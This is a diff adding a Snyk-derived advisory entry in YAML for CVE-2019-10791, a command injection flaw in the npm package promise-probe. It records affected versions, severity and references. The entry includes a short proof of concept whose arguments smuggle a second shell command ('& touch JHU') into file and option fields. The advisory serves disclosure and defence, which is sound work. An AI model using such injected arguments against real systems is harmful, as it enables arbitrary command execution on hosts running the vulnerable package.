@@ -1,0 +1,27 @@
+---
+- id: snykio:npm:promise-probe:546816
+  title: Command Injection
+  description: "[promise-probe][1] is a FFprobe wrapper.\n\nAffected versions of this
+    package are vulnerable to Command Injection\nvia the `ffprobe(file)` and `createMuteOgg(outputFile,
+    options)`\nfunctions. `file`,`outputFile`,`options` can be controlled by users\nwithout
+    any sanitization\n\n### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}\n\n
+    \   var root = require(\"promise-probe\");\n    \n    root.ffprobe(\"& touch JHU\");\n
+    \   \n    root.createMuteOgg(\"123\",{seconds:\"& touch JHU &\"});\n    \n    root.createMuteOgg(\"&
+    touch JHU\",{});\n{: .language-js}\n\n\n\n[1]: https://www.npmjs.com/package/promise-probe\n"
+  affected_package: promise-probe
+  vulnerable_versions:
+  - "<0.10.0"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10791
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-02-04
+  created_date: 2020-02-06
+  last_modified_date: 2020-02-06
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/dottgonzo/node-promise-probe/commit/0d9affb67fc1ad985903536d35372cf55efe5a45
+  source_url: https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816
